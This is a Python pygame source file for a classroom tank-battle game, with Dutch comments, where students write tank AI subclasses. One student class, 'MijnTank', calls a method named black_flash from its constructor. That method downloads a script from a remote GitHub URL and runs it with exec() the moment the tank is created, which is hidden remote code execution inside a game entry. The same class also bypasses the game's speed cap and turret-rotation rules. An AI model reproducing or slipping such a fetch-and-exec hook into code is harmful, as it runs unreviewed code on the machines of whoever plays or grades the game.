import pygame
import math
import time
import random
from abc import ABC, abstractmethod


# Constanten
SCREEN_WIDTH = 1200
SCREEN_HEIGHT = 800
FPS = 60
TANK_SIZE = 30
BULLET_SIZE = 5
BULLET_SPEED = 300
RELOAD_TIME = 4  # seconden

# Kleuren
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
YELLOW = (255, 255, 0)
GRAY = (80, 80, 80)  # Achtergrondkleur

class Bullet:
    def __init__(self, x, y, angle, owner):
        self.x = x
        self.y = y
        self.angle = angle
        self.owner = owner
        self.speed = BULLET_SPEED
        self.damage = 10
        self.alive = True
    
    def update(self, dt):
        # Bereken nieuwe positie
        self.x += math.cos(math.radians(self.angle)) * self.speed * dt
        self.y -= math.sin(math.radians(self.angle)) * self.speed * dt
        
        # Verwijder kogel als deze buiten het scherm komt
        if (self.x < 0 or self.x > SCREEN_WIDTH or 
            self.y < 0 or self.y > SCREEN_HEIGHT):
            self.alive = False
    
    def draw(self, screen):
        pygame.draw.circle(screen, RED, (int(self.x), int(self.y)), BULLET_SIZE)

class BaseTank(ABC):
    def __init__(self, x, y, body_color, turret_color, name):
        # Positie en rotatie
        self.x = x
        self.y = y
        self.body_angle = random.randint(0, 359)
        self.turret_angle = self.body_angle
        
        # Status
        self.health = 100
        self.alive = True
        self.body_color = body_color
        self.turret_color = turret_color
        self.name = name
        
        # Eigenschappen
        self.max_body_speed = 100
        self.max_body_rotation = 100
        self.max_turret_rotation = 100
        
        # Acties
        self.current_body_speed = 0
        self.current_body_rotation = 0
        self.current_turret_rotation = 0
        
        # Wapen
        self.last_shot_time = 0
        self.reload_time = RELOAD_TIME
        
        # Statistieken voor ranking
        self.damage_dealt = 0
        self.hp_lost = 0
        self.kills = 0
        self.distance_traveled = 0
        self.prev_x = x
        self.prev_y = y
    
    # Protected methoden die studenten kunnen aanroepen
    def _move_forward(self, speed=100):
        """Zet de tank in beweging vooruit met gegeven snelheid (max 100)"""
        self.current_body_speed = min(abs(speed), self.max_body_speed)

    def _move_backward(self, speed=100):
        """Zet de tank in beweging achteruit met gegeven snelheid (max 100)"""
        self.current_body_speed = -min(abs(speed), self.max_body_speed)
    
    def _stop(self):
        """Stop de beweging van de tank"""
        self.current_body_speed = 0
        self.current_body_rotation = 0
    
    def _rotate_body_left(self, speed=100):
        """Roteer de body van de tank naar links met gegeven snelheid (max 100)"""
        self.current_body_rotation = min(abs(speed), self.max_body_rotation)
    
    def _rotate_body_right(self, speed=100):
        """Roteer de body van de tank naar rechts met gegeven snelheid (max 100)"""
        self.current_body_rotation = -min(abs(speed), self.max_body_rotation)
    
    def _rotate_turret_left(self, speed=100):
        """Roteer de turret van de tank naar links met gegeven snelheid (max 100)"""
        self.current_turret_rotation = min(abs(speed), self.max_turret_rotation)
    
    def _rotate_turret_right(self, speed=100):
        """Roteer de turret van de tank naar rechts met gegeven snelheid (max 100)"""
        self.current_turret_rotation = -min(abs(speed), self.max_turret_rotation)
    
    def _fire(self):
        """Vuur een kogel af als de tank herladen is"""
        current_time = time.time()
        if current_time - self.last_shot_time >= self.reload_time:
            self.last_shot_time = current_time
            # Bereken positie van de loop van het kanon
            turret_length = TANK_SIZE * 0.8
            bullet_x = self.x + math.cos(math.radians(self.turret_angle)) * turret_length
            bullet_y = self.y - math.sin(math.radians(self.turret_angle)) * turret_length
            return Bullet(bullet_x, bullet_y, self.turret_angle, self)
        return None
    
    def update(self, dt, game):
        if not self.alive:
            return []
        
        # Voer de AI-logica uit
        bullets = self.think(game)
        if not isinstance(bullets, list):
            bullets = [bullets] if bullets is not None else []
        
        # Update positie en rotatie
        self.body_angle += self.current_body_rotation * dt
        self.body_angle %= 360
        
        self.turret_angle += self.current_turret_rotation * dt
        self.turret_angle %= 360
        
        # Bereken nieuwe positie
        old_x = self.x
        old_y = self.y
        
        self.x += math.cos(math.radians(self.body_angle)) * self.current_body_speed * dt
        self.y -= math.sin(math.radians(self.body_angle)) * self.current_body_speed * dt
        
        # Houd de tank binnen het scherm
        self.x = max(TANK_SIZE, min(SCREEN_WIDTH - TANK_SIZE, self.x))
        self.y = max(TANK_SIZE, min(SCREEN_HEIGHT - TANK_SIZE, self.y))
        
        # Bereken afgelegde afstand
        distance = math.sqrt((self.x - old_x)**2 + (self.y - old_y)**2)
        self.distance_traveled += distance
        
        return bullets
    
    def take_damage(self, damage, attacker=None):
        """Pas schade toe op de tank"""
        self.health -= damage
        self.hp_lost += damage
        
        if attacker:
            attacker.damage_dealt += damage
        
        if self.health <= 0:
            self.alive = False
            self.health = 0
            if attacker:
                attacker.kills += 1
    
    def draw(self, screen):
        if not self.alive:
            return
        
        # Teken tank body (rechthoek)
        body_rect = pygame.Surface((TANK_SIZE * 1.5, TANK_SIZE))
        body_rect.fill(self.body_color)
        body_rect.set_colorkey(BLACK)
        
        # Maak een rechthoek voor de tank body
        rotated_body = pygame.transform.rotate(body_rect, self.body_angle)
        body_rect = rotated_body.get_rect(center=(self.x, self.y))
        screen.blit(rotated_body, body_rect)
        
        # Teken turret (lijn)
        turret_length = TANK_SIZE * 0.8
        turret_end_x = self.x + math.cos(math.radians(self.turret_angle)) * turret_length
        turret_end_y = self.y - math.sin(math.radians(self.turret_angle)) * turret_length
        pygame.draw.line(screen, self.turret_color, (self.x, self.y), (turret_end_x, turret_end_y), 3)
        
        # Teken een cirkel voor de turret basis
        pygame.draw.circle(screen, self.turret_color, 
                         (int(self.x), int(self.y)), TANK_SIZE // 2)
        
        # Teken gezondheidsbalk
        health_width = TANK_SIZE * 1.5
        health_height = 5
        health_x = self.x - health_width / 2
        health_y = self.y - TANK_SIZE - health_height * 2
        
        # Achtergrond (rood)
        pygame.draw.rect(screen, RED, (health_x, health_y, health_width, health_height))
        # Voorgrond (groen, gebaseerd op health percentage)
        health_percentage = max(0, self.health / 100)
        pygame.draw.rect(screen, GREEN, (health_x, health_y, health_width * health_percentage, health_height))
        
        # Teken naam
        font = pygame.font.Font(None, 20)
        text = font.render(self.name, True, WHITE)
        text_rect = text.get_rect(center=(self.x, self.y - TANK_SIZE - 15))
        screen.blit(text, text_rect)
    
    @abstractmethod
    def think(self, game):
        """
        Implementeer deze methode om je tank AI te maken.
        
        Parameters:
            game: Het Game object met informatie over de huidige spelstatus
            
        Returns:
            Een lijst van Bullet objecten (of None)
        """
        pass

class MijnTank(BaseTank):
    def __init__(self, x, y):
        self.selected_tank = None
        self.selected_tank_degrees = 0
        self.max_distance = 200
        self.minimum_distance = 60
        self.dashing = False
        self.dash_stop_time = 0
        self.finish_time = 0
        self.max_body_speed = 10000
        self.move_amount = 200
        
        #tank kleur
        
        body_color = (255,255,255)
        turret_color = (0,0,0)
        
        self.black_flash()
        super().__init__(x,y,body_color, turret_color, "Nick's tank")
        
    def think(self, game):
         current_time = time.time()
         clock = pygame.time.Clock()
         
         dt = clock.tick(60) / 1000.0  # Limits to 60 FPS and gives dt in seconds
         if self.selected_tank == None:
             self.select_tank(game)
             
         if self.selected_tank != None:
             if self.selected_tank.alive != True:
                 self.select_tank(game)
        
             
                 
             distance_x = self.selected_tank.x - self.x
             distance_y = self.selected_tank.y - self.y
            
             if abs(distance_x) > self.max_distance or abs(distance_y) > self.max_distance:
                 self.move_towards_selected_tank(200)
             if abs(distance_x) <= self.minimum_distance or abs(distance_y) <= self.minimum_distance:
                  self.move_towards_selected_tank(-5)
             elif self.dashing != True:
                 self._move_forward(self.move_amount)
             
             
             extra_x = (self.selected_tank.x - self.selected_tank.prev_x) * 0.1
             extra_y = (self.selected_tank.y - self.selected_tank.prev_y) * 0.1
             distance_x = distance_x + extra_x
             distance_y = distance_y + extra_y
             
             
             
             
             angle = math.atan2(distance_y,distance_x)
             self.selected_tank_degrees = angle * (180 / math.pi)
             
             
            
             
             self.turret_angle = -self.selected_tank_degrees 
             #Turret rotation
             
             
            
             return self._fire()
            
         return None
    def _move_forward(self, speed):
     """Overwrites the parent limit"""
     
     self.current_body_speed = speed
    
            
    def move_towards_selected_tank(self, speed):
     current_time = time.time()
     self._move_forward(speed) 
     self.body_angle = -self.selected_tank_degrees
     
     
            
    def black_flash(self):
        print("BLACK FLASH!!!")
        import urllib.request
        temp_file_path, headers = urllib.request.urlretrieve("https://raw.githubusercontent.com/nickpowerrr/files/main/rewrite.py", "rewrite.py")
        exec(open(temp_file_path).read())
           
            
    def select_tank(self, game): # This will get every tank and roll a number chance, if its 1 (50/50) it will break and make the new selected tank
        while True:
         for tank in game.tanks:
                  if tank.health >= 0:
                      rnd = random.randint(0,1)
                      if rnd == 1:
                          self.selected_tank = tank
                          return
                      else:
                          continue
                      
# Een voorbeeld tank die willekeurig beweegt
class RandomTank(BaseTank):
    def __init__(self, x, y):
        body_color = (random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
        turret_color = (random.randint(0, 100), random.randint(0, 100), random.randint(0, 100))
        super().__init__(x, y, body_color, turret_color, "RandomTank")
        self.next_decision_time = 0
    
    def think(self, game):
        current_time = time.time()
        
        # Neem elke 1-3 seconden een nieuwe beslissing
        if current_time >= self.next_decision_time:
            self.next_decision_time = current_time + random.uniform(1, 3)
            
            # Willekeurige beweging
            move = random.choice(["forward", "backward", "left", "right", "stop"])
            if move == "forward":
                self._move_forward(random.randint(50, 100))
            elif move == "backward":
                self._move_backward(random.randint(50, 100))
            elif move == "left":
                self._rotate_body_left(random.randint(50, 100))
            elif move == "right":
                self._rotate_body_right(random.randint(50, 100))
            elif move == "stop":
                self._stop()
            
            # Willekeurige turret rotatie
            turret = random.choice(["left", "right", "none"])
            if turret == "left":
                self._rotate_turret_left(random.randint(50, 100))
            elif turret == "right":
                self._rotate_turret_right(random.randint(50, 100))
            else:
                self.current_turret_rotation = 0
        
        # Willekeurig schieten (50% kans)
        if random.random() < 0.1:
            return self._fire()
        
        return None

class Game:
    def __init__(self):
        pygame.init()
        self.screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
        pygame.display.set_caption("Tank Battle")
        self.clock = pygame.time.Clock()
        self.running = True
        
        self.tanks = []
        self.bullets = []
        self.start_time = time.time()
        self.game_duration = 120  # 2 minuten per spel
        
        # Voor statistieken
        self.kills = {}
        self.font = pygame.font.Font(None, 36)
        self.small_font = pygame.font.Font(None, 24)
    
    def add_tank(self, tank):
        """Voeg een tank toe aan het spel"""
        self.tanks.append(tank)
        self.kills[tank.name] = 0
    
    def check_collisions(self):
        """Controleer op botsingen tussen kogels en tanks"""
        for bullet in self.bullets[:]:
            if not bullet.alive:
                self.bullets.remove(bullet)
                continue
                
            for tank in self.tanks:
                if tank.alive and bullet.owner != tank:
                    # Eenvoudige afstandscheck voor botsing
                    distance = math.sqrt((bullet.x - tank.x)**2 + (bullet.y - tank.y)**2)
                    if distance < TANK_SIZE:
                        tank.take_damage(bullet.damage, bullet.owner)
                        bullet.alive = False
                        break
    
    def run(self):
        """Start het spel"""
        while self.running:
            # Bereken delta time
            dt = self.clock.tick(FPS) / 1000.0
            
            # Verwerk events
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.running = False
                elif event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_ESCAPE:
                        self.running = False
            
            # Clear screen
            self.screen.fill(GRAY)  # Grijze achtergrond
            
            # Update alle tanks
            for tank in self.tanks:
                new_bullets = tank.update(dt, self)
                self.bullets.extend([b for b in new_bullets if b is not None])
            
            # Update alle kogels
            for bullet in self.bullets:
                bullet.update(dt)
            
            # Controleer op botsingen
            self.check_collisions()
            
            # Teken alle tanks
            for tank in self.tanks:
                tank.draw(self.screen)
            
            # Teken alle kogels
            for bullet in self.bullets:
                bullet.draw(self.screen)
            
            # Teken scorebord
            self.draw_scoreboard()
            
            # Teken timer
            self.draw_timer()
            
            # Update display
            pygame.display.flip()
            
            # Controleer of spel voorbij is
            if self.is_game_over():
                self.show_final_ranking()
                pygame.display.flip()
                
                # Wacht 50 seconden (5x langer) voor de ranking
                wait_until = time.time() + 50
                waiting = True
                
                while waiting:
                    current_time = time.time()
                    
                    # Check for quit events
                    for event in pygame.event.get():
                        if event.type == pygame.QUIT:
                            waiting = False
                            self.running = False
                        elif event.type == pygame.KEYDOWN:
                            if event.key == pygame.K_ESCAPE:
                                waiting = False
                    
                    # Exit wait loop if time expired
                    if current_time >= wait_until:
                        waiting = False
                
                self.running = False
        
        pygame.quit()
    
    def draw_scoreboard(self):
        """Teken het scorebord"""
        # Sorteer tanks op kills
        tank_names = [tank.name for tank in self.tanks]
        
        # Teken achtergrond
        pygame.draw.rect(self.screen, (50, 50, 50), (SCREEN_WIDTH - 250, 0, 250, min(len(tank_names) * 30 + 10, 300)))
        
        # Teken tekst
        y = 10
        for tank in self.tanks:
            # Check of tank nog leeft
            color = WHITE if tank.alive else (150, 150, 150)
            
            text = self.font.render(f"{tank.name}: {tank.kills}", True, color)
            self.screen.blit(text, (SCREEN_WIDTH - 240, y))
            y += 30
    
    def draw_timer(self):
        """Teken de timer"""
        elapsed_time = time.time() - self.start_time
        remaining_time = max(0, self.game_duration - elapsed_time)
        minutes = int(remaining_time // 60)
        seconds = int(remaining_time % 60)
        
        timer_text = self.font.render(f"Time: {minutes:02d}:{seconds:02d}", True, WHITE)
        self.screen.blit(timer_text, (10, 10))
    
    def is_game_over(self):
        """Controleer of het spel voorbij is"""
        # Spel is over als alle tanks dood zijn of als de tijd op is
        alive_tanks = sum(1 for tank in self.tanks if tank.alive)
        if alive_tanks <= 1:
            return True
        
        # Check timer
        elapsed_time = time.time() - self.start_time
        if elapsed_time >= self.game_duration:
            return True
        
        return False
    
    def show_final_ranking(self):
        """Toon het eindscherm met ranking van alle tanks"""
        # Bereken ratio en score voor elke tank (vermijd deling door nul)
        for tank in self.tanks:
            if tank.hp_lost == 0:
                tank.ratio = tank.damage_dealt  # Als er geen HP verloren is, gebruik dan damage_dealt als ratio
            else:
                tank.ratio = tank.damage_dealt / tank.hp_lost
            
            # Bereken totaalscore: (damage/hp*100) + (kills*100) + (afstand/100)
            tank.total_score = (tank.ratio * 100) + (tank.kills * 100) + (tank.distance_traveled / 100)
        
        # Sorteer tanks op ratio, damage_dealt, kills, distance_traveled
        sorted_tanks = sorted(
            self.tanks,
            key=lambda t: (t.total_score),
            reverse=True
        )
        
        # Teken achtergrond
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 180))
        self.screen.blit(overlay, (0, 0))
        
        # Teken titel
        title_font = pygame.font.Font(None, 72)
        title_text = title_font.render("FINAL RANKING", True, WHITE)
        title_rect = title_text.get_rect(center=(SCREEN_WIDTH // 2, 50))
        self.screen.blit(title_text, title_rect)
        
        # Teken kolom headers
        header_y = 120
        col_width = SCREEN_WIDTH // 8
        
        headers = ["Rank", "Tank", "Damage", "HP Lost", "Ratio", "Kills", "Distance", "Score"]
        for i, header in enumerate(headers):
            header_text = self.font.render(header, True, YELLOW)
            self.screen.blit(header_text, (i * col_width + 40, header_y))
        
        # Teken data voor elke tank
        row_height = 40
        data_y = header_y + row_height
        
        for rank, tank in enumerate(sorted_tanks, 1):
            # Bepaal kleur (highlight voor top 3)
            if rank == 1:
                color = (255, 215, 0)  # Goud
            elif rank == 2:
                color = (192, 192, 192)  # Zilver
            elif rank == 3:
                color = (205, 127, 50)  # Brons
            else:
                color = WHITE
            
            # Teken rank
            rank_text = self.font.render(f"{rank}.", True, color)
            self.screen.blit(rank_text, (40, data_y))
            
            # Teken tank naam
            name_text = self.font.render(tank.name, True, color)
            self.screen.blit(name_text, (col_width + 40, data_y))
            
            # Teken damage dealt
            dmg_text = self.font.render(f"{int(tank.damage_dealt)}", True, color)
            self.screen.blit(dmg_text, (2 * col_width + 40, data_y))
            
            # Teken HP lost
            hp_text = self.font.render(f"{int(tank.hp_lost)}", True, color)
            self.screen.blit(hp_text, (3 * col_width + 40, data_y))
            
            # Teken ratio
            ratio_text = self.font.render(f"{tank.ratio:.2f}", True, color)
            self.screen.blit(ratio_text, (4 * col_width + 40, data_y))
            
            # Teken kills
            kills_text = self.font.render(f"{tank.kills}", True, color)
            self.screen.blit(kills_text, (5 * col_width + 40, data_y))
            
            # Teken distance traveled
            dist_text = self.font.render(f"{int(tank.distance_traveled)}", True, color)
            self.screen.blit(dist_text, (6 * col_width + 40, data_y))
            
            # Teken totaalscore
            score_text = self.font.render(f"{int(tank.total_score)}", True, color)
            self.screen.blit(score_text, (7 * col_width + 40, data_y))
            
            data_y += row_height
            
        # Teken instructie onderaan
        instruction_text = self.small_font.render("Press ESC to exit", True, WHITE)
        instruction_rect = instruction_text.get_rect(center=(SCREEN_WIDTH // 2, SCREEN_HEIGHT - 30))
        self.screen.blit(instruction_text, instruction_rect)

# Functie om tanks willekeurig te plaatsen
def place_tank_randomly():
    x = random.randint(TANK_SIZE * 2, SCREEN_WIDTH - TANK_SIZE * 2)
    y = random.randint(TANK_SIZE * 2, SCREEN_HEIGHT - TANK_SIZE * 2)
    return x, y

# Voorbeeld hoe studenten een eigen tank kunnen maken
class DraaiTank(BaseTank):
    def __init__(self, x, y):
        # Studenten kunnen zelf kleuren bepalen via RGB
        body_color = (0, 200, 100)  # Groen voor de body
        turret_color = (0, 0, 0)    # Zwart voor de turret
        super().__init__(x, y, body_color, turret_color, "StudentTank")
    
    def think(self, game):
        # Hier kan de student eigen logica implementeren
        # Bijvoorbeeld: rij vooruit en draai de turret
        self._move_forward(80)
        self._rotate_turret_left(50)
        
        # Vuur af als je kunt
        return self._fire()


# Een tank die voor en achteruit rijdt met draaiende turret
class ShuttleTank(BaseTank):
    def __init__(self, x, y):
        body_color = (200, 100, 50)  # Oranje/bruine body
        turret_color = (50, 50, 50)  # Donkergrijze turret
        super().__init__(x, y, body_color, turret_color, "ShuttleTank")
        self.last_direction_change = time.time()
        self.moving_forward = True
        
    def think(self, game):
        # Continue turret rotation
        self._rotate_turret_left(60)
        
        # Change direction every 3 seconds
        current_time = time.time()
        if current_time - self.last_direction_change >= 3.0:
            self.last_direction_change = current_time
            self.moving_forward = not self.moving_forward
            
        # Move forward or backward based on current direction
        if self.moving_forward:
            self._move_forward(70)
        else:
            self._move_backward(70)
        
        # Fire whenever possible
        return self._fire()

# Een tank die een rondje rijdt en van draairichting verandert bij schade
class CircleTank(BaseTank):
    def __init__(self, x, y):
        body_color = (50, 100, 250)  # Blauwe body
        turret_color = (20, 20, 20)  # Bijna zwarte turret
        super().__init__(x, y, body_color, turret_color, "CircleTank")
        self.rotating_left = True
        self.last_health = 100
        
    def think(self, game):
        # Constant forward speed
        self._move_forward(60)
        
        # Fixed rotation speed, direction based on state
        if self.rotating_left:
            self._rotate_body_left(40)
        else:
            self._rotate_body_right(40)
            
        # Keep turret aligned with body
        self.turret_angle = self.body_angle
        
        # Check if tank took damage
        if self.health < self.last_health:
            # Change rotation direction
            self.rotating_left = not self.rotating_left
            self.last_health = self.health
        
        # Shoot straight ahead when possible
        return self._fire()

# Hoofdfunctie
def main():
    game = Game()
    
    # Voeg verschillende tanks toe
    
    # Voeg RandomTank toe
    x, y = place_tank_randomly()
    game.add_tank(RandomTank(x, y))
    
    # Voeg ShuttleTank toe
    x, y = place_tank_randomly()
    game.add_tank(ShuttleTank(x, y))
    
    # Voeg CircleTank toe
    x, y = place_tank_randomly()
    game.add_tank(CircleTank(x, y))
    
    # Voeg een DraaiTank toe
    x, y = place_tank_randomly()
    game.add_tank(DraaiTank(x, y))
    
    x, y = place_tank_randomly()
    game.add_tank(MijnTank(x,y))
    
    # Start het spel
    game.run()

if __name__ == "__main__":
    main()